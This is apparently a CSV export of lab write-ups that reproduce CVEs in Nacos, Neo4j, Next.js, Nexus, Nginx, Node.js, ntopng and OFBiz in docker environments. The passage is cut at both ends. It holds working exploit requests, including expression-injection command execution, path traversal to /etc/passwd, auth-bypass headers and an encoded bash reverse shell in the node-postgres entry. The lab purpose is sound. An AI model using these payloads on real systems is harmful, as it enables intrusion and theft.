<https://github.com/alibaba/nacos/issues/4463
<https://github.com/ayoundzw/nacos-poc
<http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce

Vulnerable environment

Execute following command to start a Alibaba Nacos 1.4.0:


docker compose up -d


After server is started, brwose the http://your-ip:8848/nacos/ you will see the default login page of Nacos.

Exploit

Execute POC to exploit the issue, the -t parameter specifies the target address, the -c parameter specifies the command to be executed:


python poc.py -t http://your-ip:8848 -c ""ps aux""


And you will see the ps aux is executed successfully:

json
{""code"":200,""message"":null,""data"":""""}
{""code"":200,""message"":null,""data"":[{""B"":0,""A"":""USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot           1  0.0  0.0 814608  4992 ?        Ss   18:47   0:00 [rosetta] /bin/bash /bin/bash bin/docker-startup.shroot          31 25.5  7.5 10414040 1534908 ?    Sl   18:47   1:14 [rosetta] /usr/lib/jvm/java-1.8.0-openjdk/bin/java /usr/lib/jvm/java-1.8.0-openjdk/bin/java -agentlib:jdwp=transport=dtsocket,server=y,suspend=n,address=9555 -Xms2g -Xmx2g -Xmn1g -Dnacos.standalone=true -Dnacos.core.auth.enabled=true -Dnacos.member.list= -Djava.ext.dirs=/usr/lib/jvm/java-1.8.0-openjdk/jre/lib/ext:/usr/lib/jvm/java-1.8.0-openjdk/lib/ext:/home/nacos/plugins/health:/home/nacos/plugins/cmdb:/home/nacos/plugins/mysql -Xloggc:/home/nacos/logs/nacosgc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M -Dnacos.home=/home/nacos -jar /home/nacos/target/nacos-server.jar --spring.config.location=/home/nacos/init.d/,file:/home/nacos/conf/,classpath:/,classpath:/config/,file:./,file:./config/ --spring.config.name=application,custom --logging.config=/home/nacos/conf/nacos-logback.xml --server.max-http-header-size=524288root         406  0.0  0.0 854552  5504 ?        R    18:51   0:00 ps aux""}]}
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
https://github.com/alibaba/nacos/issues/4463
https://github.com/ayoundzw/nacos-poc
http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce
http://your-ip:8848"
nacos,CVE-2021-29441,Nacos Authentication Bypass(CVE-2021-29441),"Nacos Authentication Bypass(CVE-2021-29441)

中文版本(Chinese version)

Nacos is a new open source project launched by Alibaba. It is a dynamic service discovery, configuration management and service management platform that makes it easier to build cloud-native applications. Committed to helping discover, configure, and manage microservices. Nacos provides a set of simple and easy-to-use feature sets that can quickly realize dynamic service discovery, service configuration, service metadata and traffic management.

The vulnerability occurs when nacos will determine whether the requested user-agent is ""Nacos-Server"" when performing authentication and authorization operations, and if it is, it will not perform any authentication. The original intention of the developer is to handle some server-to-server requests. However, because the configuration is too simple, and the negotiated user-agent is set to Nacos-Server, it is directly hard-coded in the code, which leads to the emergence of loopholes. And by using this unauthorized vulnerability, an attacker can obtain sensitive information such as usernames and passwords.

Reference links:
https://github.com/advisories/GHSA-36hp-jr8h-556f

Vulnerable environments

Running vulnerability environment：

shell
docker compose up -d


After the environment is running, ports 3306, 8848, 9848 and 9555 will be open. In this exploit, we only need to use port 8848, which is the web access port.When executing the vulnerability verification process, please visit port 8848 first to confirm it is open. In some cases the nacos service will fail to start (caused by the inability to connect to the database), you can restart the nacos service or restart all services

shell
docker compose restart nacos



Exploit Scripts

shell

python poc.py http://target:8848





Exploit

The vulnerability exploitation process is as follows.

1. Change the value of User-Agent to Nacos-Server in the request package
2. Visit http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 to see if the status code is 200 and if the content contains pageItems
3. Visit http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub to add a new user using the POST method
4. Visit http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 for a list of existing users
5. Visit http://target:8848/nacos/ and log in using the new user added (vulhub/vulhub)

Detecting the presence of vulnerabilities



After adding the Header header, visit http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 to see if the return value is 200 and if the content contains pageItems.

Adding a new user



After adding the Header header use POST to request http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub to add a new user with the account and password of vulhub

Login using the newly created account
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-36hp-jr8h-556f
http://target:8848
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
http://target:8848/nacos/"
neo4j,CVE-2021-34371,Neo4j Shell Server setSessionVariable Deserialization (CVE-2021-34371),"Neo4j Shell Server setSessionVariable Deserialization (CVE-2021-34371)

中文版本(Chinese version)

Neo4j is a graph database management system developed by Neo4j, Inc.

Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI service that arbitrarily deserializes Java objects, e.g., through setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.

Neo4j Shell is replaced by Cyber Shell after Neo4j 3.5.

References:
https://www.exploit-db.com/exploits/50170
https://github.com/mozilla/rhino/issues/520

Vulnerable Environment

If you are using Linux or OSX, you can execute the following command to start a Neo4j 3.4.18:


TARGET_IP=<your-ipdocker compose up -d


Environment TARGET_IP is a configuration to describe the Neo4j's hostname.

If you are using Windows, update the content of docker-compose.yml and modify the environment manually.

Once the service is started, visit http://your-ip:7474 to see the web management page, but what we need to attack is port 1337, which is the Neo4j Shell port and uses the RMI protocol to communicate.

Exploit

Sending RMI request through the Rhino Gadget:



touch /tmp/success5 has been successfully executed:
-------------------------------------------------------------------------------","https://www.exploit-db.com/exploits/50170
https://github.com/mozilla/rhino/issues/520"
next.js,CVE-2025-29927,Next.js Middleware Authorization Bypass (CVE-2025-29927),"Next.js Middleware Authorization Bypass (CVE-2025-29927)

中文版本(Chinese version)

Next.js is a popular React-based web application framework providing features such as server-side rendering, static site generation, and an integrated routing system. When configured to use middleware for authentication and authorization purposes, versions prior to 14.2.25 and 15.2.3 are vulnerable to an authorization bypass.

The vulnerability allows attackers to bypass middleware-based security controls by manipulating the x-middleware-subrequest header, potentially gaining unauthorized access to protected resources and sensitive data.

References:
<https://github.com/advisories/GHSA-f82v-jwr5-mffw
<https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
<https://nvd.nist.gov/vuln/detail/CVE-2025-29927

Environment Setup

Execute the following command to start a vulnerable application based on Next.js 15.2.2:


docker compose up -d


After the application starts, visit http://your-ip:3000 you will be redirected to the login page. Input the default credentials admin:password to login and access the dashboard.

Vulnerability Reproduction

If you try to access the dashboard directly without legal credentials, you will be redirected to the login page:


curl -i http://your-ip:3000




To exploit the vulnerability, you can add the x-middleware-subrequest header with the value middleware:middleware:middleware:middleware:middleware in the request. The Next.js middleware will incorrectly process this header and bypass the authentication checks:


curl -i -H ""x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"" http://your-ip:3000




As you can see, the dashboard is accessible without any authentication.

You can also try the header x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware if the previous payload doesn't work.
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-f82v-jwr5-mffw
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
https://nvd.nist.gov/vuln/detail/CVE-2025-29927
http://your-ip:3000
http://your-ip:3000"
nexus,CVE-2024-4956,Nexus Repository Manager 3 Unauthenticated Path Traversal (CVE-2024-4956),"Nexus Repository Manager 3 Unauthenticated Path Traversal (CVE-2024-4956)

中文版本(Chinese version)

Nexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.

A path traversal vulnerability has been discovered in Nexus Repository 3 before version 3.68.1, the vulnerability allows for an attacker to craft a URL to return any file as a download, including system files outside of Nexus Repository application scope, without any authentication.

References:
<https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16

Vulnerable environment

Execute following command to start a Nexus Repository Manager version 3.68.0:


docker compose up -d


After the server is started, browse http://your-ip:8081 to see the home page of Nexus.

Exploit

Just like SpringMVC CVE-2018-1271 from Orange Tsai's share, Jetty's URIUtil.canonicalPath() also treats the empty string as a directory which is the root cause of this vulnerability:



Simply send following request to reproduce the issue:


GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0




As you can see, /etc/passwd has been exposed directly:
-------------------------------------------------------------------------------",https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16
nexus,CVE-2019-7238,Nexus Repository Manager 3 Unauthenticated Remote Code Execution (CVE-2019-7238),"Nexus Repository Manager 3 Unauthenticated Remote Code Execution (CVE-2019-7238)

中文版本(Chinese version)

Nexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.

In the version <= 3.14.0, insufficient access control and JEXL expression injection issue have been discovered in Nexus Repository 3 that allows for an unauthenticated attacker to execute arbitrary code by crafting a malicious request to Nexus Repository.

References:
https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019
https://xz.aliyun.com/t/4136
https://www.anquanke.com/post/id/171116
http://commons.apache.org/proper/commons-jexl/

Vulnerable environment

Execute following command to start a Nexus Repository Manager version 3.21.1:


docker compose up -d


After the server is started, browse http://your-ip:8081 to see the home page of Nexus. Login the admin panel with account admin:admin123 and finish the initialize wizard.

Then, upload a JAR package through maven-releases:



To exploit this issue, Nexus Repository should have at least one package.

Exploit

Send following request to execute touch /tmp/success command, no authentication needed:


POST /service/extdirect HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: /
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 368
Connection: close

{""action"":""coreui_Component"",""method"":""previewAssets"",""data"":[{""page"":1,""start"":0,""limit"":50,""sort"":[{""property"":""name"",""direction"":""ASC""}],""filter"":
[{""property"":""repositoryName"",""value"":""*""},{""property"":""expression"",""value"":""233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')""},{""property"":""type"",""value"":""jexl""}]}],""type"":""rpc"",""tid"":8}


As you can see, /tmp/success is executed:



The principle is that the JEXL expression in the expression position is executed, please refer to the documentation for details.

Use BCEL classloader to archive printable response:
-------------------------------------------------------------------------------","https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019
https://xz.aliyun.com/t/4136
https://www.anquanke.com/post/id/171116
http://commons.apache.org/proper/commons-jexl/"
nexus,CVE-2020-10204,Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10204),"Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10204)

中文版本(Chinese version)

Nexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.

In the version <= 3.21.1, a EL injection vulnerability has been discovered that allows for an attacker with an administrative account on Nexus Repository to execute arbitrary code by crafting a malicious request to Nexus Repository. This issue is patch bypass of CVE-2018-16621.

References:
https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md
https://github.com/jas502n/CVE-2020-10199

Vulnerable environment

Execute following command to start a Nexus Repository Manager version 3.21.1:


docker compose up -d


After the server is started, browse http://your-ip:8081 to see the home page of Nexus. Login the admin panel with administrator account admin:admin and finish the initialize wizard.

Exploit

Copy your cookie and CSRF token then send following request:


POST /service/extdirect HTTP/1.1
Host: your-ip
Content-Length: 223
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: [csrf-token]
Content-Type: application/json
Accept: /
Origin: http://192.168.1.3:8081
Referer: http://192.168.1.3:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=[csrf-token]; NXSESSIONID=[sessionid]
Connection: close

{""action"":""coreui_User"",""method"":""update"",""data"":[{""userId"":""admin"",""version"":""2"",""firstName"":""admin"",""lastName"":""User"",""email"":""admin@example.org"",""status"":""active"",""roles"":[""nxadmin$\\B{233*233}""]}],""type"":""rpc"",""tid"":11}


As you can see, EL expression 233*233 is executed:



Refer to <https://github.com/jas502n/CVE-2020-10199, use EL expression payload $\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')} to execute command touch /tmp/success:
-------------------------------------------------------------------------------","https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md
https://github.com/jas502n/CVE-2020-10199
http://192.168.1.3:8081
http://192.168.1.3:8081/
https://github.com/jas502n/CVE-2020-10199"
nexus,CVE-2020-10199,Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10199),"Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10199)

中文版本(Chinese version)

Nexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.

In the version <= 3.21.1, a EL injection vulnerability has been discovered that allows for an attacker with any type of account on Nexus Repository to execute arbitrary code by crafting a malicious request to Nexus Repository.

References:
https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10199/README.md
https://github.com/jas502n/CVE-2020-10199

Vulnerable environment

Execute following command to start a Nexus Repository Manager version 3.21.1:


docker compose up -d


After the server is started, browse http://your-ip:8081 to see the home page of Nexus. Login the admin panel with account admin:admin and finish the initialize wizard.

Exploit

Copy your cookie and CSRF token then send following request:


POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 203
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10154) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: [csrf-token]
Content-Type: application/json
Accept: /
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=[csrf-token]; NXSESSIONID=[session-id]
Connection: close

{
  ""name"": ""internal"",
  ""online"": true,
  ""storage"": {
    ""blobStoreName"": ""default"",
    ""strictContentTypeValidation"": true
  },
  ""group"": {
    ""memberNames"": [""$\\A{233233233}""]
  }
}




Refer to <https://github.com/jas502n/CVE-2020-10199, use EL expression payload $\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')} to execute command touch /tmp/success.
-------------------------------------------------------------------------------","https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10199/README.md
https://github.com/jas502n/CVE-2020-10199
http://127.0.0.1:8081
http://127.0.0.1:8081/
https://github.com/jas502n/CVE-2020-10199"
nginx,CVE-2013-4547,Nginx Filename Logic Vulnerability (CVE-2013-4547),"Nginx Filename Logic Vulnerability (CVE-2013-4547)

中文版本(Chinese version)

Nginx is a web server that can be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. Nginx 0.8.41 through 1.4.3 and 1.5.x before 1.5.7 allows remote attackers to bypass intended restrictions via an unescaped space character in a URI.

This vulnerability is not directly related to code execution. The main cause is the incorrect parsing of request URIs, which leads to incorrect retrieval of user-requested filenames, resulting in privilege bypass and code execution as side effects.

For example, when Nginx matches requests ending with .php, it sends them to fastcgi for parsing. A common configuration looks like this:


location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgiparam  SCRIPTFILENAME  /var/www/html$fastcgiscriptname;
    fastcgiparam  DOCUMENTROOT /var/www/html;
}


Under normal circumstances (with pathinfo disabled), only files with .php extensions are sent to fastcgi for parsing.

However, in the presence of CVE-2013-4547, when we request 1.gif[0x20][0x00].php, this URI matches the regular expression \.php$ and enters this Location block. But after entering, Nginx incorrectly identifies the requested file as 1.gif[0x20] and sets it as the value of SCRIPT_FILENAME to send to fastcgi.

Fastcgi then parses based on the value of SCRIPT_FILENAME, ultimately resulting in a parsing vulnerability. Therefore, we only need to upload a file ending with a space to make PHP parse it.

Here's another example. Many websites restrict backend access to specific IPs:


location /admin/ {
    allow 127.0.0.1;
    deny all;
}


We can request the following URI: /test[0x20]/../admin/index.php. This URI won't match the location pattern /admin/, thus bypassing the IP verification. However, the actual requested file is /test[0x20]/../admin/index.php, which resolves to /admin/index.php, successfully accessing the backend. (This requires having a directory called ""test "": this is a Linux system feature. If a directory doesn't exist, even when jumping to the parent directory, it will throw a file not found error. Windows doesn't have this restriction)

References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547
https://blog.werner.wiki/file-resolution-vulnerability-nginx/
http://www.91ri.org/9064.html

Environment Setup

Run the following command to start a Nginx server 1.4.2:


docker compose up -d


After the environment starts, visit http://your-ip:8080/ to see an upload page.

Vulnerability Reproduce

This server uses blacklist validation, and we cannot upload files with .php extensions. We need to exploit CVE-2013-4547. We upload a ""1.gif "" (note the space at the end):



Visit http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php, and you'll find that PHP has been parsed:



Note: [0x20] is a space, [0x00] is \0, and these characters don't need to be encoded.
-------------------------------------------------------------------------------","http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547
https://blog.werner.wiki/file-resolution-vulnerability-nginx/
http://www.91ri.org/9064.html"
nginx,Unknown,Nginx Misconfiguration Vulnerabilities,"Nginx Misconfiguration Vulnerabilities

中文版本(Chinese version)

Nginx is a web server that can be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. This environment contains three vulnerabilities caused by Nginx misconfiguration.

Environment Setup

Execute the following command to start a Nginx server with multiple vulnerabilities:


docker compose up -d


After successful execution, Nginx will listen on three ports: 8080/8081/8082, corresponding to three different vulnerabilities.

Mistake 1. CRLF Injection Vulnerability

Nginx decodes $uri, which means inputting %0d%0a can introduce line breaks, leading to CRLF injection vulnerabilities.

Example of incorrect configuration (originally intended to redirect HTTP requests to HTTPS):


location / {
    return 302 https://$host$uri;
}


Payload: http://your-ip:8080/%0d%0aSet-Cookie:%20a=1, which can inject a Set-Cookie header.

  

Using techniques from the article ""Bottle HTTP Header Injection Vulnerability Analysis"", you can construct an XSS vulnerability:



Mistake 2. Directory Traversal Vulnerability

When configuring aliases in Nginx, forgetting to add a / will create a directory traversal vulnerability.

Example of incorrect configuration (originally intended to allow users to access files in the /home/ directory):


location /files {
    alias /home/;
}


Payload: http://your-ip:8081/files../, successfully traversing to the root directory:



Mistake 3. add_header Override

The addheader directive in Nginx configuration child blocks (server, location, if) will override HTTP headers added by addheader in the parent block, potentially creating security risks.

For example, in the following code, CSP headers are added site-wide (in the parent block):


add_header Content-Security-Policy ""default-src 'self'"";
add_header X-Frame-Options DENY;

location = /test1 {
    rewrite ^(.*)$ /xss.html break;
}

location = /test2 {
    add_header X-Content-Type-Options nosniff;
    rewrite ^(.*)$ /xss.html break;
}


However, because the /test2 location block adds an X-Content-Type-Options header, all add_header directives in the parent block become ineffective:



XSS can be triggered:
-------------------------------------------------------------------------------",https://$host$uri;
nginx,Unknown,Nginx Parsing Vulnerability,"Nginx Parsing Vulnerability

中文版本(Chinese version)

Nginx is a web server that can be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. This environment contains a parsing vulnerability caused by improper user configuration.

Version information:
Latest version of Nginx 1.x
Latest version of PHP 7.1.x

This indicates that the vulnerability is not related to specific Nginx or PHP versions, but rather is caused by improper user configuration leading to parsing vulnerabilities.

The vulnerability exists because of how Nginx handles file extensions in its configuration. When a request is made to a file with multiple extensions (like file.jpg.php), Nginx may process it based on the last extension, even if the file was originally uploaded as an image.

This misconfiguration commonly occurs in the following Nginx configuration:

nginx
location ~ \.php$ {
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgiparam  SCRIPTFILENAME  /var/www/html$fastcgiscriptname;
    include        fastcgi_params;
}


When a request is made to file.jpg/.php, Nginx will treat it as a PHP file and send it to the PHP-FPM for processing, even though it's actually an image file. This behavior can be exploited to execute malicious code that was uploaded as an image file.

Environment Setup

Execute the following command to start a Nginx server with a parsing vulnerability:


docker compose up -d


After successful execution, the Nginx server will listen on port 80.

Vulnerability Reproduce

Visit http://your-ip/uploadfiles/nginx.png and http://your-ip/uploadfiles/nginx.png/.php to see the effect.

Normal display:



After adding the /.php suffix, the file is parsed as a PHP file:



Visit http://your-ip/index.php to test the upload functionality. While the upload code itself has no vulnerabilities, you can get a shell by exploiting the parsing vulnerability:





To prevent this vulnerability:

1. Configure proper file extension handling in Nginx
2. Implement strict file type validation
3. Store uploaded files outside of the web root
4. Use random file names for uploaded files
5. Implement proper access controls
-------------------------------------------------------------------------------",
nginx,CVE-2017-7529,Nginx Cache Leak by Integer Overflow (CVE-2017-7529),"Nginx Cache Leak by Integer Overflow (CVE-2017-7529)

中文版本(Chinese version)

Nginx is a web server that can be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. When Nginx acts as a reverse proxy, it typically caches certain files, especially static files. The cached content is stored in files, with each cache file containing a ""file header"" + ""HTTP response header"" + ""HTTP response body"". If a subsequent request hits this cache file, Nginx will directly return the ""HTTP response body"" from the file to the user.

Nginx versions since 0.5.6 up to and including 1.13.2 are vulnerable to integer overflow vulnerability in nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.

If a request contains a Range header, Nginx will return content of specified length based on the start and end positions provided. However, if we construct two negative positions, such as (-600, -9223372036854774591), it becomes possible to read data from negative positions. If this request hits a cache file, we may be able to read the ""file header"" and ""HTTP response header"" that are located before the ""HTTP response body"" in the cache file.

References:
https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7
http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/

Environment Setup

Run the following command to start a Nginx server version 1.13.2:


docker compose up -d


After the server starts, visit http://your-ip:8080/ to see the Nginx default page, which is actually content reverse proxied from port 8081.

Vulnerability Reproduce

Run python3 poc.py http://your-ip:8080/ and check the returned results:



As you can see, we've successfully read the ""file header"" and ""HTTP response header"" content located before the ""HTTP response body"" through out-of-bounds reading.

If the reading is incorrect, try adjusting the offset address (605) in poc.py.
-------------------------------------------------------------------------------","https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7
http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
http://your-ip:8080/`"
node,CVE-2017-14849,Node.js 8.5.0 Path Traversal (CVE-2017-14849),"Node.js 8.5.0 Path Traversal (CVE-2017-14849)

中文版本(Chinese version)

Node.js is a cross-platform, open-source JavaScript runtime environment. Node.js 8.5.0 before 8.6.0 allows remote attackers to access unintended files, because a change to "".."" handling was incompatible with the pathname validation used by unspecified community modules.

The vulnerability exists due to a logic error in Node.js 8.5.0's normalize function when handling directory paths. When traversing up directories (e.g., ../../../../../../etc/passwd), adding foo/../ in the middle of the path (e.g., ../../../foo/../../../../etc/passwd) causes normalize to incorrectly return /etc/passwd, when the correct result should be ../../../../../../etc/passwd.

Web frameworks like Express typically provide static file server functionality that relies on the normalize function. For example, Express uses the normalize function to check if a path exceeds the static directory boundaries. The above bug causes the normalize function to return incorrect results, bypassing these checks and leading to arbitrary file read vulnerabilities.

While the normalize bug could potentially affect more than just Express and requires further investigation, its impact is limited since the bug was introduced in Node.js 8.5.0 and was fixed in version 8.6.

Reference links:
https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/
https://security.tencent.com/index.php/blog/msg/121

Environment Setup

Run following commands to build and run a vulnerable application based on the Node.JS 8.5.0 and Express 4.15.5:


docker compose build
docker compose up -d


Visit http://your-ip:3000/ to see a web page that references the file /static/main.js, indicating the presence of a static file server.

Vulnerability Reproduce

Send the following request to read the passwd file:


GET /static/../../../a/../../../../etc/passwd HTTP/1.1
Host: your-ip:3000
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
-------------------------------------------------------------------------------","https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/
https://security.tencent.com/index.php/blog/msg/121"
node,CVE-2017-16082,Node-Postgres Remote Code Execution (CVE-2017-16082),"Node-Postgres Remote Code Execution (CVE-2017-16082)

中文版本(Chinese version)

Node-postgres is a Node.js client for PostgreSQL. It is a popular database connector for Node.js applications.

When node-postgres processes a PostgreSQL response packet of type Row Description, it concatenates the field names into the code. Due to improper escaping, a specially crafted field name can escape the code's single quote restriction, leading to code execution vulnerability.

Reference links:
https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html
https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
https://zhuanlan.zhihu.com/p/28575189

Environment Setup

Run the following commands to build and start a vulnerable application based on node-postgres 7.1.0:


docker compose build
docker compose up -d


After the server is successfully started, visit http://your-ip:3000/?id=1 to view information for user with id 1. Using sqlmap, you can discover that there is an injection point here, and the database is PostgreSQL:



Vulnerability Reproduce

We can then assume that the node-postgres code execution vulnerability exists here. Write the command you want to execute echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash, then split it appropriately (each segment should not exceed 64 characters) and replace it in the following payload:


SELECT 1 AS ""\']=0;require=process.mainModule.constructor.load;/"", 2 AS ""/p=require(childprocess);/"", 3 AS ""/p.exec(echo YmFzaCAtaSA+JiAvZGV2L3Rj+/"", 4 AS ""/cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash)//""


Send the above payload after encoding:



Successfully execute commands, such as reverse shell:



Because there are many difficulties in the reproduction process, if you encounter errors during payload generation and testing, please read this article to understand the underlying principles and find the source of the problem.
-------------------------------------------------------------------------------","https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html
https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
https://zhuanlan.zhihu.com/p/28575189"
ntopng,CVE-2021-28073,ntopng Authentication Bypass (CVE-2021-28073),"ntopng Authentication Bypass (CVE-2021-28073)

中文版本(Chinese version)

Ntopng is a passive network monitoring tool focused on flows and statistics that can be obtained from the traffic captured by the server.

There is a authentication bypass vulnerability in ntopng 4.2 and previous versions.

Reference link:
http://noahblog.360.cn/ntopng-multiple-vulnerabilities/

Vulnerability Environment

Execute the following command to start ntopng:


docker compose up -d


After the server is started, browse the http://your-ip:3000 to see the login page, whose default password is admin/admin, and the password will be request to reset for the first login.

Vulnerability Reproduce

According to the reference link and the simple poc.py, calculate the length of the ntopng lua directory:


python poc.py --url http://your-ip:3000/ baselength




It can be seen that the path length in the Vulhub container is 36.

Then, browse the page or interface that we want to access without authorization, such as /lua/find_prefs.lua, and it will be redirected to the login page.

Use POC to generate unauthorized access URL:


python poc.py --url http://your-ip:3000/ generate -l 36 -p find_prefs.lua




The interface is able to access without authorization through this URL:
-------------------------------------------------------------------------------","http://noahblog.360.cn/ntopng-multiple-vulnerabilities/
http://your-ip:3000/
http://your-ip:3000/"
ofbiz,CVE-2024-38856,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-38856),"Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-38856)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

This vulnerability occurs as a result of incomplete fixing for CVE-2023-51467. In Apache OFBiz version 18.12.11, the developers believe they have fixed the vulnerability, but in reality, they have only addressed one method of exploiting it. The Groovy expression injection still exists and allows unauthorized users to execute arbitrary commands on the server.

References:
<https://github.com/apache/ofbiz-framework/commit/31d8d7
<https://forum.butian.net/article/524
<https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz

Vulnerable environment

Executing following command to start an Apache OfBiz 18.12.14 server:


docker compose up


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

Send following request to execute command id by Groovy script:


POST /webtools/control/main/ProgramExport HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
